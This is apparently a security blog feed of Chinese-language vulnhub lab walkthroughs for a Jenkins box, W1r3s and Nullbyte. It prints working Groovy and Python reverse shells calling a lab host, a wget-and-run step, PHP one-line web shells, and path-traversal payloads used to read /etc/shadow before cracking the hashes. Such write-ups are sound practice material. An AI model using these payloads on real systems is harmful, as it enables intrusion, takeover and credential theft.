src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195131.png" alt="image.png"></p><blockquote><p>在“脚本命令行”功能中发现可以运行命令，提示说使用Groovy语法，google出简单语法，发现可以执行：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195143.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195203.png" alt="image.png"></p><blockquote><p>这里尝试了常规的rce使用的bash反弹，失败，甚至无法执行bash等shell命令，存疑！</p></blockquote><blockquote><p>常规rce反弹失败，直接从(<a href="https://forum.ywhack.com/shell.php)%E7%94%9F%E6%88%90Groovy%E8%AF%AD%E6%B3%95%E7%9A%84%E5%8F%8D%E5%BC%B9shell%EF%BC%9A">https://forum.ywhack.com/shell.php)生成Groovy语法的反弹shell：</a></p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195212.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195223.png" alt="image.png"></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs Groovy">String host=<span class="hljs-string">&quot;10.10.10.128&quot;</span>;<br><span class="hljs-type">int</span> port=<span class="hljs-number">9999</span>;<br>String cmd=<span class="hljs-string">&quot;/bin/bash&quot;</span>;<br>Process p=<span class="hljs-keyword">new</span> ProcessBuilder(cmd).redirectErrorStream(<span class="hljs-literal">true</span>).start();<br>Socket s=<span class="hljs-keyword">new</span> Socket(host,port);<br>InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();<br>OutputStream po=p.getOutputStream(),so=s.getOutputStream();<span class="hljs-keyword">while</span>(!s.isClosed())<br>&#123;<span class="hljs-keyword">while</span>(pi.available()&gt;<span class="hljs-number">0</span>)so.write(pi.read());<span class="hljs-keyword">while</span>(pe.available()&gt;<span class="hljs-number">0</span>)so.write(pe.read());<br>    <span class="hljs-keyword">while</span>(si.available()&gt;<span class="hljs-number">0</span>)po.write(si.read());so.flush();po.flush();Thread.sleep(<span class="hljs-number">50</span>);<span class="hljs-keyword">try</span><br>&#123;p.exitValue();<span class="hljs-keyword">break</span>;&#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;&#125;&#125;;p.destroy();s.close();<br><br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195240.png" alt="image.png"></p><blockquote><p>拿到立足点jenkins用户的shell</p></blockquote><h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><blockquote><p>初步信息探查：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195250.png" alt="image.png"></p><blockquote><p>自动任务枚举：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195258.png" alt="image.png"></p><blockquote><p>有root运行的自动任务，且文件有777权限<br>不知道为什么起不了交互shell，只能用重定向的方法把反弹shell语句写入自动任务脚本了：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195309.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195317.png" alt="image.png"></p><blockquote><p>拿到root flag</p></blockquote><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><ol><li>端口扫描：80 web服务、8080 Jenkins后台、22 ssh、3306 mysql</li><li>web渗透：从80隐藏页面拿到Jenkins登录凭据，使用Jenkins的脚本命令行实现getshell（其余多种攻击手法见下文）</li><li>提权：存在root身份的777权限的自动任务，修改后弹出root shell</li></ol><h2 id="0x05-Jenkins攻击向量总结"><a href="#0x05-Jenkins攻击向量总结" class="headerlink" title="0x05 Jenkins攻击向量总结"></a>0x05 Jenkins攻击向量总结</h2><h3 id="尝试拿配置文件"><a href="#尝试拿配置文件" class="headerlink" title="尝试拿配置文件"></a>尝试拿配置文件</h3><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195336.png" alt="image.png"></p><h3 id="脚本命令行"><a href="#脚本命令行" class="headerlink" title="脚本命令行"></a>脚本命令行</h3><blockquote><ol><li>简单命令执行(注意该语句不可执行反弹shell)：</li></ol></blockquote><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Groovy"><span class="hljs-string">&quot;whoami&quot;</span>.execute().text;<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195345.png" alt="image.png"></p><blockquote><ol start="2"><li>修改文件：</li></ol></blockquote><blockquote><p>以本靶机来说，在用上述简单命令执行语句发现系统存在自动任务提权时，即可通过直接在此处修改任务文件一步get rootshell</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195357.png" alt="image.png"></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs groovy">java.nio.file.Files.write(java.nio.file.Paths.get(<span class="hljs-string">&quot;/etc/script/CleaningScript.sh&quot;</span>), <span class="hljs-string">&quot;\nbbb&quot;</span>.getBytes(), java.nio.file.StandardOpenOption.APPEND);<br><span class="hljs-string">&quot;cat /etc/script/CleaningScript.sh&quot;</span>.execute().text;<br></code></pre></td></tr></table></figure><blockquote><p>将APPEND替换为TRUNCATE_EXISTING可不用追加，直接覆盖</p></blockquote><blockquote><ol start="3"><li>创建新文件(写马)：</li></ol></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195407.png" alt="image.png"></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs groovy"><span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;/var/www/html/shell.php&quot;</span>).write(<span class="hljs-string">&#x27;&lt;?php @eval($_POST[cmd]);?&gt;&#x27;</span>);<br></code></pre></td></tr></table></figure><blockquote><p>有写权限时即可写入</p></blockquote><blockquote><ol start="4"><li>反弹shell：</li></ol></blockquote><blockquote><p>使用groovy语句反弹shell：</p></blockquote><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs Groovy">String host=<span class="hljs-string">&quot;10.10.10.128&quot;</span>;<br><span class="hljs-type">int</span> port=<span class="hljs-number">9999</span>;<br>String cmd=<span class="hljs-string">&quot;/bin/bash&quot;</span>;<br>Process p=<span class="hljs-keyword">new</span> ProcessBuilder(cmd).redirectErrorStream(<span class="hljs-literal">true</span>).start();<br>Socket s=<span class="hljs-keyword">new</span> Socket(host,port);<br>InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();<br>OutputStream po=p.getOutputStream(),so=s.getOutputStream();<span class="hljs-keyword">while</span>(!s.isClosed())<br>&#123;<span class="hljs-keyword">while</span>(pi.available()&gt;<span class="hljs-number">0</span>)so.write(pi.read());<span class="hljs-keyword">while</span>(pe.available()&gt;<span class="hljs-number">0</span>)so.write(pe.read());<br>    <span class="hljs-keyword">while</span>(si.available()&gt;<span class="hljs-number">0</span>)po.write(si.read());so.flush();po.flush();Thread.sleep(<span class="hljs-number">50</span>);<span class="hljs-keyword">try</span><br>&#123;p.exitValue();<span class="hljs-keyword">break</span>;&#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;&#125;&#125;;p.destroy();s.close();<br><br></code></pre></td></tr></table></figure><blockquote><p>wget python文件反弹shell：</p></blockquote><blockquote><p>写python反弹脚本，wget到tmp下，再执行即可</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># This is a Python reverse shell script</span><br><br><span class="hljs-keyword">import</span> socket,subprocess,os;<br>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);<br>s.connect((<span class="hljs-string">&quot;10.10.10.128&quot;</span>,<span class="hljs-number">9999</span>));<br>os.dup2(s.fileno(),<span class="hljs-number">0</span>);<br>os.dup2(s.fileno(),<span class="hljs-number">1</span>);<br>os.dup2(s.fileno(),<span class="hljs-number">2</span>);<br>p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);<br></code></pre></td></tr></table></figure><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs groovy"><span class="hljs-string">&quot;wget http://10.10.10.128:80/2.py -P /tmp/&quot;</span>.execute().text;<br><span class="hljs-string">&quot;cat /tmp/2.py&quot;</span>.execute().text ;<br><span class="hljs-comment">//&quot;python /tmp/2.py&quot;.execute().text ;</span><br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195629.png" alt="image.png"></p><blockquote><p>去掉注释符执行，拿到shell：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195643.png" alt="image.png"></p><h3 id="新建任务"><a href="#新建任务" class="headerlink" title="新建任务"></a>新建任务</h3><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195653.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195700.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195912.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195950.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327200423.png" alt="image.png"><br><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327200428.png" alt="image.png"></p><h3 id="公开漏洞利用"><a href="#公开漏洞利用" class="headerlink" title="公开漏洞利用"></a>公开漏洞利用</h3><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327200449.png" alt="image.png"></p><blockquote><p>还有一个之前刚冲浪看到的新的CVE2024的RCE</p></blockquote><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.secpulse.com/archives/2166.html"># 知其一不知其二之Jenkins Hacking</a><br><a href="https://posts.careerengine.us/p/5ff2dba78a9c343551e94ea7"># Jenkins 漏洞利用</a></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulhub W1r3s1.0.1</title>
    <link href="/blog/vulnhub/vulnhub%20W1r3s1.0.1/"/>
    <url>/blog/vulnhub/vulnhub%20W1r3s1.0.1/</url>
    
    <content type="html"><![CDATA[<p>vulhub W1r3s1.0.1 walkthrough</p><h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><blockquote><p>主机发现</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191221.png" alt="image.png"></p><blockquote><p>全端口扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191234.png" alt="image.png"></p><blockquote><p>排序： 80 web、21 ftp、3306 mysql、22 ssh</p></blockquote><blockquote><p>详细信息扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191327.png" alt="image.png"></p><blockquote><p>ubuntu、mysql、apache、ftp存在匿名访问，考虑把ftp优先级提前到web前</p></blockquote><blockquote><p>脚本扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191344.png" alt="image.png"></p><blockquote><p>扫到了wordpress登录页面，先记下来<br>还是准备先从ftp渗透开始</p></blockquote><h2 id="0x02-ftp渗透"><a href="#0x02-ftp渗透" class="headerlink" title="0x02 ftp渗透"></a>0x02 ftp渗透</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191353.png" alt="image.png"></p><blockquote><p>匿名空密码登录，换binary模式，发现三个目录，其中的文件都可读，全部get下来</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191413.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191434.png" alt="image.png"></p><blockquote><p>02.txt 好像有些信息，先存下两个字符串</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191442.png" alt="image.png"></p><blockquote><p>employee给了员工信息<br>worktodo说 <code>I don&#39;t think this is the way to root</code>，不知道它想表达什么<br>先去处理刚刚的两个字符串：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191450.png" alt="image.png"></p><blockquote><p>一个md5，一个base64，解码：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191459.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191507.png" alt="image.png"></p><blockquote><p>虽然他说不是密码，但还是先存下来<br>ftp渗透暂时应该结束了，转入web渗透：</p></blockquote><h2 id="0x03-web渗透"><a href="#0x03-web渗透" class="headerlink" title="0x03 web渗透"></a>0x03 web渗透</h2><blockquote><p>刚刚看到了有wordpress，先跑起gobuster目录爆破：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191520.png" alt="image.png"></p><blockquote><p>唯一的收获就是有admin后台，但是301了<br>再跑下dirb的：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191537.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191616.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191739.png" alt="image.png"></p><blockquote><p>收获只有uploads路径可以访问</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191801.png" alt="image.png"></p><blockquote><p>web页面又是熟悉的ubuntu默认页面，省了不少事<br>可以直接去看wordpress登录界面了：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191838.png" alt="image.png"></p><blockquote><p>查看源码发现了好像是wordpress的版本4.9.24</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191849.png" alt="image.png"></p><blockquote><p>尝试sql注入，不管输什么都会报无法连接：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191859.png" alt="image.png"></p><blockquote><p>很奇怪，为什么是跳转到了localhost？看源码：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191914.png" alt="image.png"></p><blockquote><p>果然是写死的跳转localhost<br>想了想好像也没有ssrf的点，突发奇想他的其他301页面可能也是这个逻辑，跳转到localhost，拿刚开始扫出来没管的administrator页面尝试：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191929.png" alt="image.png"></p><blockquote><p>一试发现是直接转到了另一个有效页面，居然能直接访问到管理页面<br>当时一看到管理页面是301就想当然的以为跳转的目标是登录界面，导致走了不少弯路<br>那么就顺着新线索往下走：</p></blockquote><h3 id="cms公开漏洞利用"><a href="#cms公开漏洞利用" class="headerlink" title="cms公开漏洞利用"></a>cms公开漏洞利用</h3><blockquote><p>该页面暴露了：php配置文件可写、php版本、可文件上传、cms为cuppa<br>点next前往下一个页面：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191940.png" alt="image.png"></p><blockquote><p>暴露了：<br>mysql：root可能是空密码<br>管理员账户：admin@admin</p></blockquote><blockquote><p>尝试连接数据库：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192002.png" alt="image.png"></p><blockquote><p>尝试ssh：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192011.png" alt="image.png"></p><blockquote><p>没办法，接着next：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192018.png" alt="image.png"></p><blockquote><p>反复测注入：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192029.png" alt="image.png"></p><blockquote><p>毫无收获<br>虽然并未发现cuppa的版本，但也只能尝试一下公开漏洞利用了<br>(实在不行就只剩wordpress的孤公开漏洞利用这条路尝试了)</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192052.png" alt="image.png"></p><blockquote><p>在我们目前没有进到wordpress后台时，可能的利用只有25971(cuppa)和47690</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192102.png" alt="image.png"></p><blockquote><p>看文档好像是个未授权的洞，谷歌后发现也是需要登录后才可能的利用</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192111.png" alt="image.png"></p><blockquote><p>说这个页面写了可控的文件包含语句，尝试访问该页面：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192130.png" alt="image.png"></p><blockquote><p>没报404，有希望</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192139.png" alt="image.png"></p><blockquote><p>没包含到，但是因为是request接收，尝试同时传个post：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192146.png" alt="image.png"></p><h3 id="文件包含模糊测试"><a href="#文件包含模糊测试" class="headerlink" title="文件包含模糊测试"></a>文件包含模糊测试</h3><blockquote><p>包含成功了，尝试远程文件包含：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192157.png" alt="image.png"></p><blockquote><p>包含失败，应该是关掉了远程包含<br>尝试包含日志文件getshell：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192204.png" alt="image.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/httpd/</span>access.log<br>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/apache2/</span>access.log<br>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/apache2/</span>error.log<br>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/httpd/</span>error.log<br></code></pre></td></tr></table></figure><blockquote><p>测试了apache的几个常规日志路径，均失败<br>尝试data写马：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192230.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192239.png" alt="image.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">data:text/plain,<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;hack.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php @eval($_POST[v])?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br>data:text/plain,<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>尝试data协议写马，失败<br>尝试包含ssh日志：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192251.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192258.png" alt="image.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/var/</span>log/auth.log<br>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/var/</span>log/secure<br></code></pre></td></tr></table></figure><blockquote><p>测试常见路径包含ssh日志getshell失败<br>尝试UA写马：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192321.png" alt="image.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/proc/</span>self/environ<br></code></pre></td></tr></table></figure><blockquote><p>又失败了，麻了，感觉可以放弃rce了<br>转回读文件，先读读web路径下的：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192331.png" alt="image.png"></p><blockquote><p>没有回显，可能是web路径错了，但是保险起见还是拿passwd试试：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192339.png" alt="image.png"></p><blockquote><p>可以确定了，好像不能使用伪协议，也难怪前面的测试全都没用<br>从web路径拿配置文件这条路也断了<br>只能转回最开始的passwd看看了：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192350.png" alt="image.png"></p><blockquote><p>密码也都隐藏了<br>根本没抱希望的包含了shadow文件，意外的发现居然配置错误，我们能访问：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192412.png" alt="image.png"></p><h3 id="shadow破解"><a href="#shadow破解" class="headerlink" title="shadow破解"></a>shadow破解</h3><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192504.png" alt="image.png"></p><blockquote><p>passwd和shadow存下来，unshadow一下，john破解：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192525.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192534.png" alt="image.png"></p><blockquote><p>解出了www-data的密码，先尝试登录www-data：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192544.png" alt="image.png"></p><blockquote><p>发现可能是有每次ssh后直接断开的自动脚本，之后提权可以注意</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192553.png" alt="image.png"></p><blockquote><p>w1r3s的破解也成功了，这里应该已经可以结束了，毕竟不可能把root也让解出来<br>尝试登录到w1r3s：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192615.png" alt="image.png"></p><blockquote><p>拿到立足点</p></blockquote><h3 id="john历史记录问题"><a href="#john历史记录问题" class="headerlink" title="john历史记录问题"></a>john历史记录问题</h3><blockquote><p>被 john 破解过的hash会被存储在john.pot中，再次破解会报错：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192625.png" alt="image.png"></p><blockquote><p>解决方法：</p><ol><li>删除&#x2F;root&#x2F;.john&#x2F;john.pot的内容</li><li>使用<code>john --show &lt;文件名&gt;</code>查看历史记录（推荐）</li></ol></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192633.png" alt="image.png"></p><h2 id="0x04-提权到root"><a href="#0x04-提权到root" class="headerlink" title="0x04 提权到root"></a>0x04 提权到root</h2><blockquote><p>刚准备开始提权坐牢，刚sudo枚举，发现是ALL：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192655.png" alt="image.png"></p><blockquote><p>拿到flag</p></blockquote><h2 id="0x05-反思补足"><a href="#0x05-反思补足" class="headerlink" title="0x05 反思补足"></a>0x05 反思补足</h2><blockquote><p>关于为什么测试的所有php伪协议均未成功：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192705.png" alt="image.png"></p><blockquote><p>该文件包含漏洞点已经写死了拼接的前半句路径，也就是为什么必须要目录穿越才能包含到的原因</p></blockquote><h2 id="0x06-看wp及视频后反思补足"><a href="#0x06-看wp及视频后反思补足" class="headerlink" title="0x06 看wp及视频后反思补足"></a>0x06 看wp及视频后反思补足</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><blockquote><ol><li>nmap全端口扫描时最好加入<code>-sT</code> 参数，以发送完整数据包</li></ol></blockquote><blockquote><ol start="2"><li>nmap -oA后，查看.nmap文件获得标准扫描结果</li></ol></blockquote><blockquote><ol start="3"><li>保险起见的udp扫描语句： <code>nmap -sU --top-ports 20 &lt;IP&gt;</code></li></ol></blockquote><blockquote><ol start="4"><li>所有路走不通时，必要时要考虑ipv6</li></ol></blockquote><h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><blockquote><ol><li>prompt关闭交互，即不用每次选确定</li></ol></blockquote><blockquote><ol start="2"><li>mget *.txt 批量下载文件</li></ol></blockquote><h3 id="杂"><a href="#杂" class="headerlink" title="杂"></a>杂</h3><blockquote><ol><li>ascii generator可生成ascii组成的logo<br><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192715.png" alt="image.png"></li></ol></blockquote><blockquote><ol start="2"><li><code>echo -n &#39;&lt;string&gt;&#39; | md5sum</code> 可以md5编码</li></ol></blockquote><blockquote><ol start="3"><li>当发现cms存在公开漏洞时，甚至可以github等地查看源码，看代码逻辑</li></ol></blockquote><blockquote><ol start="4"><li>虽然此靶机ssh密码很弱，可以hydra爆破ssh登录达成秒杀，但打靶过程尽量不选择爆破ssh</li></ol></blockquote><h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><ol><li>端口扫描：ftp匿名登录、web wordpress、ssh、mysql</li><li>ftp匿名登录 ：无有效信息</li><li>web渗透：与wordpress相关页面均跳转localhost判断行不通；目录爆破出管理后台cms，存在文件包含公开漏洞，测试各文件包含姿势后，目录穿越拿到shadow文件，破解出ssh密钥</li><li>提权：sudo ALL直接提权</li></ol>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub Nullbyte</title>
    <link href="/blog/vulnhub/vulnhub%20Nullbyte/"/>
    <url>/blog/vulnhub/vulnhub%20Nullbyte/</url>
    
    <content type="html"><![CDATA[<p>vulnhub Nullbyte walkthrough</p><h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><blockquote><p>主机发现：<br><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/1.png" alt="1"></p></blockquote><blockquote><p>全端口扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/2.png" alt="1"></p><blockquote><p>详细信息扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/3.png" alt="1"></p><blockquote><p>从rpcinfo感觉可能需要用到udp端口，多扫下udp：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/4.png" alt="1"></p><blockquote><p>只开了rpcbind和一个网络配置服务(zeroconf)，看来无需udp</p></blockquote><blockquote><p>接着脚本扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/5.png" alt="1"></p><blockquote><p>枚举出了phpmyadmin和uploads页面，思路转到web渗透</p></blockquote><h2 id="0x02-web渗透"><a href="#0x02-web渗透" class="headerlink" title="0x02 web渗透"></a>0x02 web渗透</h2><blockquote><p>先打开目录爆破：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/6.png" alt="1"></p><blockquote><p>访问web服务：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/Nullbyte/7.png" alt="1"></p><blockquote><p>只有一个图片，先下载，等待目录爆破结果：</p></blockquote><p><img 